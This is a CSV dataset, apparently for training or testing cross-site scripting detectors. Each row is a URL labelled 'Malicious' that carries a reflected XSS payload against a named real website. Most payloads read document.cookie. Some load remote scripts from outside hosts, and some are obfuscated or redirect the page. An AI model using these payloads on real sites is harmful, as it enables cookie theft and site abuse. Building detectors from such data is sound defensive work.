Payloads,Class
http://www.aidslaw.ca/publications/interfaces/downloaddocumentfile.php?ref=855%27%22%3e%3c/title%3e%<br>3cscript%3ealert%281337%29%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%3c/h1%3e%3c/marquee%3e,Malicious
http://n.xmbs.jp/n.php?id=kyoufu&amp;c_num=13756'%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/s<br>cript%3e&amp;no=53677&amp;view=1&amp;page=2,Malicious
http://tadamag.jp/_/inquiry.php?back='%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%22)%<br>3c/script%3e,Malicious
http://www.highportal.net/includes/sendnews.aspx?id=%22%22/%3e%3cscript%3ealert%28/securitylab.ir/%2<br>9%3c/script%3e,Malicious
http://www.vodafonemusic.co.uk/index.cfm?action=%22%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c<br>/marquee%3e%3cbody%20onload=%22alert(1)%22%3e,Malicious
http://www.kunsthal.nl/32-search.html?key=%22%3e%3cscript%3ealert%20%28/%20killer-tr%20/%29%3c/scrip<br>t%3e%3ch1%3ekiller-tr%20was%20here%3c/h1%3e,Malicious
http://lnnr.lummi-nsn.gov/lummiwebsite/search.php?pageid=9%22%3e%3cscript%3ealert(document.cookie)%3<br>c/script%3e,Malicious
http://www.opensourceschool.de/15.html?tx_ttproducts_pi1[product]=%22%3e%3cscript%3ealert(1);%3c/scr<br>ipt%3e,Malicious
http://www.fast2web.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoo<br>r&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://search.gbg.bg/search.phtml?q=x&amp;submit=%d2%fa%f0%f1%e8&amp;s=0&amp;wh=0&amp;ea=0&amp;count=%22%3e%27%3e%3cscri<br>pt%3ealert(123)%3c/script%3e&amp;order=0&amp;ct=0,Malicious
http://www.ddlbay.com/search.php?q=%3ch1%3e%3ccenter%3ehacking-gurus%3c/center%3e%3cbr%3e%3cmarquee%<br>3edont-mess-with-us%3c/marquee%3e%3c/h1%3e,Malicious
http://www.enom.com/domains/register.asp?sld=asasas&amp;tld=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;h1&gt;ccc+was+here&lt;<br>/h1&gt;&amp;submit.x=11&amp;submit.y=15&amp;submit=submit&amp;alltld=0&amp;spincount=15,Malicious
http://www.freecollegescholarships.net/form.php?c=%22%3e%3cscript%3ealert(document.cookie)%3c/script<br>%3e&amp;forcelp=,Malicious
http://taz.vv.sebank.se/cgi-bin/pts3/pos/sebse.asp?serverkey=primary&amp;collection=sebse&amp;resultstart=0&amp;<br>defaulttext=s%c3%b6k+p%c3%a5+seb.se&amp;lang=se&amp;querytext=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fsc<br>ript%3e%22,Malicious
http://buscar.uol.com.ar/radaruol.html?q=%3e%22%3e%3cscript%3ealert('norehem%20was%20here!!')%3c/scr<br>ipt%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h<br>1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%2<br>2%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious
http://new.megabbs.com/cgi-bin/readres.cgi?bo=erov&amp;vi=1064912410&amp;rs=&amp;res=&amp;search=%27%3e%22%3e%3cscri<br>pt%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fx.js%3e%3c%2fscript%3e,Malicious
http://www.avianca.com/inicio/navegacion/comprar/home.htm?idioma=es&amp;pais=cl'%22%3e%3ch1%3etest,Malicious
http://cinestar.de/de/kino/berlin-imax-3d-im-sony-center/filme/?tpl=131&amp;filmid=454241&amp;prefix=&quot;&gt;&lt;scri<br>pt&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.crete.gov.gr/kep.asp?id=10&amp;nomid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.forgetsecurity.se/products/screenshots.php?lang=%22%3e%3ciframe%20onload=alert%28/xss/%29%3e,Malicious
"http://extension.harvard.edu/search/apachesolr_search/%27;alert%28string.fromcharcode%2888,83,83%29%<br>29//%5c%27;alert%28string.fromcharcode%2888,83,83%29%29//%22;alert%28string.fromcharcode%2888,83,83%<br>29%29//%5c%22;alert%28string.fromcharcode%2888,83,83%29%29//--%3e%3c/script%3e%22%3e%27%3e%3cscript%<br>3ealert%28string.fromcharcode%2888,83,83%29%29%3c/script%3e",Malicious
http://www.ourautumnyears.com/pictures/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.flipkart.com/search-book?dd=0&amp;query=jhumpa%2f%3ciframe%20src=http://xssed.com%3e%3c/ifram<br>e%3e,Malicious
http://www.centralsource.com/blenderart/index.php?lang=japanese%22%3e%27%3e%3c%73%63%72%69%70%74%3e%<br>61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%3<br>3%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31<br>%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.chestercountyweb.com/utilities/popup_calendar.cfm?formname=&quot;&gt;&lt;script&gt;alert(&quot;cyber-warrior<br>.org&quot;)&lt;/script&gt;,Malicious
http://notrefamille-cadeaux.tf1.fr/v2/services-prenom/idees-prenoms.asp?sex=1&amp;pop=0&amp;rate=0&amp;tobedata=<br>%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;contient=%22%3e%3cscript%3ealert%28docum<br>ent.cookie%29%3c%2fscript%3e&amp;nottobedata=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e<br>&amp;letternumber=0&amp;comp=-1&amp;image3.x=41&amp;image3.y=8,Malicious
http://www.toyota.com.ve/dealers/index.asp?formid=1&amp;searchvalue=&quot;&gt;&lt;script&gt;alert(&quot;bluemax-grayhatz.or<br>g&quot;)&lt;/script&gt;,Malicious
http://mv.music.yahoo.com/player/error.asp?edsc=&gt;&lt;script&gt;alert('bugreport.ir xss for<br>xssed.com')&lt;/script&gt;&lt;!--&amp;reloaded=1,Malicious
http://www.radware.co.il/content/events/campaigns/default.asp?_t=&amp;leadsrc=%22%3e%3cscript%3ealert(do<br>cument.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://www.nga.gr.jp/cgi-bin/membertop.pl?mode=report&amp;id=1123&amp;referrer='%3e%22%3e%3cscript/src=http:<br>//kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.intute.ac.uk/artsandhumanities/cgi-bin/ejournallist.pl?code=ejournal&amp;sub=music&amp;display=mu<br>sic%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylit<br>ol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.sirantarim.gov.tr/test/php/php_info.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/s<br>cript%3e,Malicious
http://adsense.rediff.com/cgi-bin/adworks/getp4cads.cgi?keywords=%3e%3c/script%3e%3cscript%3ealert(d<br>ocument.cookie)%3c/script%3e%3e%3ch1%3edjsedat%20narcoticxs%3c/h1%3e&amp;page_nm=/websearch_results-righ<br>t.htm,Malicious
http://willyoumarrymekc.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.ofpra.gouv.fr/index.html?dtd_id=%22;alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,<br>83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,8<br>9,32,83,85,88))%3c/script%3e",Malicious
http://www.metallica.com/interactive/printnewsitem.asp?item=600685&amp;title=&quot;&gt;&lt;h1&gt;xssed&lt;script&gt;alert(do<br>cument.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gptcashcow.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/script<br>%3e,Malicious
http://www.abaragambi.com/index.php?cat=3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b%3c/sc<br>ript%3e,Malicious
http://www.redeye.com/?s=as_perform_advancedsearch&amp;as_perform_advancedsearch=true&amp;as_querytype=words<br>&amp;as_posts_pages=both&amp;as_sortby=relevance&amp;as_searchquery=%22%3e%3cscript%3ealert%28document.cookie%29<br>%3c%2fscript%3e&amp;x=9&amp;y=12,Malicious
http://www.gimpelfang.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://lara.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/script<br>%3e,Malicious
http://www.adrem.nl/3783/default.aspx?query=%22%3e%3cscript%3ealert%281123%29%3c/script%3e,Malicious
http://www.2coolcode.com/cgi-bin/ourspace/login.cgi?command=%22%3e%3cscript%3ealert(document.cookie)<br>%3c/script%3e,Malicious
http://www.g4s.com/se-search_results.htm?col=sec&amp;la=en&amp;charset=charset%3diso-8859-1&amp;st=1&amp;nh=5&amp;ql=a&amp;q<br>t=%3cscript%3ealert(/g4s=security%20company?/);alert(/dont%20think%20so.../)%3c%2fscript%3e%3ciframe<br>%20src=%22http://www.google.com%22/%3e&amp;search-submit.x=0&amp;search-submit.y=0&amp;search-submit=go,Malicious
http://www.fppc.ca.gov/events.php?event_day=1%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/scr<br>ipt%3e3&amp;event_month=5&amp;event_year=2010,Malicious
http://smartdefense.zonealarm.com/tmpl/body/virus/virussearch_ks.jsp?vn=trojan-dropper.win32.small.%<br>22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%4<br>3%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39<br>%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%<br>69%70%74%3e%0adl&amp;view=sdrc&amp;reset=t,Malicious
http://www.whois.net/whois_new.cgi?d=%22%3e%3cscript+src%3d%22http%3a%2f%2fuploaders.4000webs.com%2f<br>xss.js%3f&amp;tld=com,Malicious
http://search.searchengineland.com/search?p=q&amp;ts=custom&amp;w=%27%3e%3c%2fscript%3e%3cscript%3ealert%281<br>23%29%3c%2fscript%3e%22%27,Malicious
http://www.wahlsdorf.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdo<br>or&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://kekstra.com/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.usedsaxes.com/showcategory.php?cid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://post.detik.com/share/u.php?url_share=%22%3e%3c/a%3e%3c/iframe%3e%3ciframe%20src=http://xssed.<br>com%3e%3c/iframe%3e%3cnoscript%3e,Malicious
http://www.bougezautrement.gouv.fr/bougezautrement/spip.php?action=cookie&amp;url=java:%22/%3e%3cscript%<br>3ealert('hello%20the%20rat')%3c/script%3e,Malicious
http://www.intel-research.net/viewseminarabstract.asp?index=%22%3e'%3e%3cscript%20src=http://vuln.xs<br>sed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://science.gsfc.nasa.gov/sed/index.cfm?srchfield=%27%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript%3e&x=37&y=4&fuseaction=search.quick,Malicious
http://www.digitalpoint.com/tools/suggestion/?keywords=testicles&lt;/title&gt;&lt;script&gt;alert(document.cooki<br>e);&lt;/script&gt;&lt;!-- &amp;country=us,Malicious
http://crashtest.motori.it.msn.com/?idm=%22%3e%3c/noscript%3e%3cscript%3ealert(%22hacked%20by%20dark<br>_net%22)%3c/script%3e,Malicious
http://www.halloweengiveaway.com/members.php?id=3550%22%3e%3cscript%3ealert%28document.cookie%29%3c/<br>script%3e,Malicious
http://www.afec-en-ligne.org/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20the%20ra<br>t')%3c/script%3e,Malicious
http://www.stickam.jp/whoslive.do?listtype=live&amp;lang=%22%3e%27%3e%3cscript%3ealert%28%22xss%22%29%3c<br>%2fscript%3e&amp;page=1,Malicious
http://www.caldera.com/en/news.php?page=news%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.emergencyclosingcenter.com/ecc/search.jsp%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.hopsings.de/biwa/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.visitnh.gov/search-results.aspx?kw=%22%3e%27%3e%3c/script%3e%3cscript%3ealert(123)%3c/scr<br>ipt%3e,Malicious
http://www.f-windows.com/display.cfm?pt=2&amp;vid=1170804162_3x04x151240231&amp;rpt=1&amp;kt=8&amp;kp=8&amp;s=&quot;&gt;&lt;script&gt;<br>alert('0ssi3-x-hackers.us')&lt;/script&gt;,Malicious
http://www.msavionics.com/registration/freesite/register.asp?id=81664&amp;email=adminsali@yahoo.com&amp;site<br>=4%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20<br>xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.blog-bell.com/s.php?word=%3c/title%3e'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3<br>e%3c/script%3e&amp;rows=20&amp;category=all&amp;submit=%8c%9f%8d%f5,Malicious
http://blog.davidvelduque.com/index.php?a[]=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
"http://www.tasteofsouthflorida.com/cgi-bin/tseekdir.cgi?location=root-miami,045dade_restaurants-south_beach%27%3e%3cscript%3ealert%28%22cr4t3r%20was%20here%22%29;//%3c/script%3",Malicious
http://www.systranet.fr/?text=%27%22%3e%3c/textarea%3e%3cscript%3ealert(/xss/)%3c/script%3e%3cmarque<br>e%20bgcolor=%22red%20by%20xylitol%22%3e%3ch1%3exss%3c/h1%3e%3c/marquee%3e&amp;lp=en_fr,Malicious
http://www.bumpdanasty.com//member/profile_blogs_page.php?blog_profile_id=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;<br>)&lt;/script&gt;,Malicious
http://www.diarioperfil.com.ar/edimp/0221/articulo.php?art=4915&amp;ed=%22%3e%3cscript%20src=http://vuln<br>.xssed.net/thirdparty/scripts/ckers.org.js%3e%3c/script%3e,Malicious
http://www.xylitol.net/index.php?action=search&amp;search-action=search&amp;search-phrase=%22%3e%3cscript%3e<br>alert%280%29%3c%2fscript%3e&amp;x=10&amp;y=7,Malicious
http://search.nissanusa.com/search?q=&lt;/title&gt;&lt;script&gt;alert('xssed by<br>samthg')&lt;/script&gt;&amp;ie=utf-8&amp;language=en&amp;site=nissanusa_en&amp;output=xml_no_dtd&amp;client=default_frontend_p<br>rod&amp;proxystylesheet=default_frontend_prod&amp;oe=utf-8,Malicious
"http://www.zdnet.com.au/whitepaper/0,2000063326,16001210q,00.htm?sort=&quot;&gt;&lt;script&gt;alert('turkhackeriz.<br>com')&lt;/script&gt;&lt;h1&gt;turkhackeriz.com&lt;/h1&gt;",Malicious
http://www.oflaztour.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.portviewconstruction.co.uk/replica/philboard/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;a<br>lert(document.cookie)&lt;/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.unterwasserrugby.org/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=&quot;&gt;&lt;script&gt;alert(&quot;x<br>ssedbycicosz&quot;)&lt;/script&gt;,Malicious
http://www.54ab.com/company.asp?id=1&amp;name=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee%3e%<br>3ch1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious
http://annuaire.pro/ajouter.asp?categoo=achat&amp;mail=xss&amp;nomm=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;<br>src=&quot;http://yourjavascript.com/27544112151/xss.atmon3r.js&quot;&gt;&lt;/script&gt;,Malicious
http://www.itemlocator.net/scripts/cgiip.exe/wservice=ils3/webspeed/%22%3e%3cscript%3ealert%281337%2<br>9%3c/script%3e,Malicious
http://hostinglerim.com/site_mesaj.asp?gitsayfa=baskasayfa&amp;hangisayfa=default.asp&amp;strmsg=%22%3e%3csc<br>ript%3ealert(1)%3c/script%3e,Malicious
http://www.medicare.gov/glossary/showterm.asp?language=english&amp;term=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;,Malicious
http://www.sogou.com/web?query=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22%27&amp;pid=58009<br>401&amp;w=01010100,Malicious
http://xmlrpc-epi.sourceforge.net/main.php?t=%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://www.sardc.net/editorial/sadctoday/portcomments.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)<br>&lt;/script&gt;,Malicious
https://portal.sun.com/cwplogin/login.jsp?liferayurl=https://xssed.com%27%22%3e%3c/title%3e%3cscript<br>%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.michelin.pl/pl/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://empleos.execuzone.com/index.php?page=account.apply&amp;id=%22%3e%3cscript%20src=http://vuln.xssed<br>.net/thirdparty/scripts/ckers.org.js%3e%3c/script%3e,Malicious
http://www.dialogues-cns.org/recherche_liste.asp?search=nosology}%3c/style%3e%3cscript%3ea=eval;b=al<br>ert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/mar<br>quee%3e,Malicious
http://search.cancer.org/search?client=amcancer&amp;site=amcancer&amp;output=xml_no_dtd&amp;proxystylesheet=amca<br>ncer&amp;restrict=cancer&amp;q=%22%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e,Malicious
http://mail.gawab.com/trywebmail3.html?username='%3e%3cscript%3ealert(document.cookie)%3c/script%3e&amp;<br>domain='%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://pl.boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e<br>%3ch1%3eby%20kusomiso.com%3c/h1%3e,Malicious
http://www.iict.pt/docbweb/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxtrm=20&amp;trmcols=2&amp;fo<br>rm=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.smartweb.fr/virtualvisit/monument/up.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://www4.clustrmaps.com/counter/maps.php?url=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3<br>e,Malicious
http://www.dotcr.ost.dot.gov/asp/redirect.asp?url=%22%3e%3cscript%3ealert('by%20encore')%3c/script%3<br>e,Malicious
http://www.css.ap.sony.com/vaio/usefulinfo/usingvaio.asp?title=%3cscript%3ealert('agd_scorp')%3c/scr<br>ipt%3e,Malicious
http://www.eden.rutgers.edu/~hyzhang/phpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][<br>][][][][][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious
http://www.pc-koubou.jp/goods/keycampaign.php?b=xss_by_kusomiso.com&amp;title='%3e%22%3e%3cscript/src=ht<br>tp://kusomiso.com/xss.js%3e%3c/script%3e&amp;sort=up&amp;pc=50,Malicious
http://www.tipo.gov.tw/service/news/showtalkcontent.asp?postnum=13684&amp;dep=%22%3e'%3e%3cscript%20src=<br>http://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://search.nba.com/search/promosearch?sp_a=sp10033e5e&amp;sp_f=iso-8859-1&amp;sp-t=nba&amp;sp_advanced=&amp;sp_q=<br>xss%3a%29%3f&amp;x=&quot;&gt;&lt;script&gt;alert('zuhaha+0ssi3_tr')&lt;/script&gt;,Malicious
http://www.meezmeyer.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.rrdonnelley.com.br/busca.php?busca=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscri<br>pt%3e&amp;buscar.x=14&amp;buscar.y=7,Malicious
"http://baixatudo.globo.com/baixatudo/busca/0,,bud0-7637,00.html?&amp;categorialista=&amp;q=%3cscript%3ealert<br>%28string.fromcharcode%2888%2c83%2c83%2c32%2c98%2c121%2c32%2c66%2c117%2c103%2c66%2c117%2c115%2c116%2<br>c101%2c114%2c32%2c45%2c32%2c76%2c101%2c105%2c97%2c32%2c98%2c117%2c103%2c98%2c117%2c115%2c116%2c101%2<br>c114%2c46%2c99%2c111%2c109%2c46%2c98%2c114%29%29%3b%3c%2fscript%3e&amp;category=&amp;idate=&amp;edate=&amp;i=&amp;s=&amp;qfo<br>rmatada=%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%2c32%2c98%2c121%2c32%2c66%2c117%2c103<br>%2c66%2c117%2c115%2c116%2c101%2c114%2c32%2c45%2c32%2c76%2c101%2c105%2c97%2c32%2c98%2c117%2c103%2c98%<br>2c117%2c115%2c116%2c101%2c114%2c46%2c99%2c111%2c109%2c46%2c98%2c114%29%29%3b%3c%2fscript%3e&amp;pr=0",Malicious
http://www.nissanaccessories247.com/refer.asp?mcid=&amp;scid=&amp;pid=1735&amp;modelyear=&quot;&gt;&lt;script&gt;alert(1);&lt;/sc<br>ript&gt;&lt;!--,Malicious
http://robot.metu.edu.tr/~deniz/resim/index.php?op=5&amp;path=duvarkagidi&amp;file=&lt;script+src=http://starex<br>t.by.ru/lt.js&gt;,Malicious
"http://searchsqlserver.techtarget.com/loginmembersonly/1,289498,sid87_gci1069644,00.html?nexturl=htt<br>p%3a//searchsqlserver.techtarget.com/news/article/0%2c289142%2csid87_gci1069644%2c00.html%3ftrack%3d<br>nl-464%26ad%3d%22%3e%3cscript%3ealert%28%27trex%27%29%3c/script%3e%3ch1%3ehacked%2520by%2520trex/h1%<br>3e",Malicious
http://hotlists.hotornot.com/?state=embed&amp;wid=nlosgzel&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;aut<br>htoken=undefined&amp;username=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.besttubeclips.com/search?w=%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://cslt.shmh.gov.cn/dispbbs.asp?boardid=13&amp;id=282&amp;page=18%27%22%3e%3c/title%3e%3cscript%3ealert(<br>%22xss%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marq<br>uee%3e,Malicious
http://www.someecards.com/search-cards/newest?search='&quot;&gt;<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--&amp;x=0&amp;y=0&amp;search_category_id=&amp;search_by_tags=1&amp;search_by_t<br>ext=1,Malicious
http://www.a-market.jp/index.php?word=%3c/title%3e'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js<br>%3e%3c/script%3e&amp;x=25&amp;y=4&amp;model=itemsearchlist,Malicious
http://smartinternet.com.au/errorpage.aspx?errmsg=%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.die-schockers.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.iph.fgov.be/keywords.asp?zoekstringkeywords=%22%3e%3cscript%3ealert('by%20encore')%3c/scr<br>ipt%3e,Malicious
http://www.lincoln.com/search-lincoln/?f%3asearchinputstring=moonzorg&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;&amp;f%3asearch=search&amp;formid=globalsearchform,Malicious
http://www.zaman.com.tr/webapp-tr/ara.do?method=search&amp;keyfield=%22%3e%3ch1%3eby%20st@rext%3cmeta%20<br>http-equiv=%22refresh%22%20content=%221;url=http://lht.by.ru/uyar1.html%22%3e,Malicious
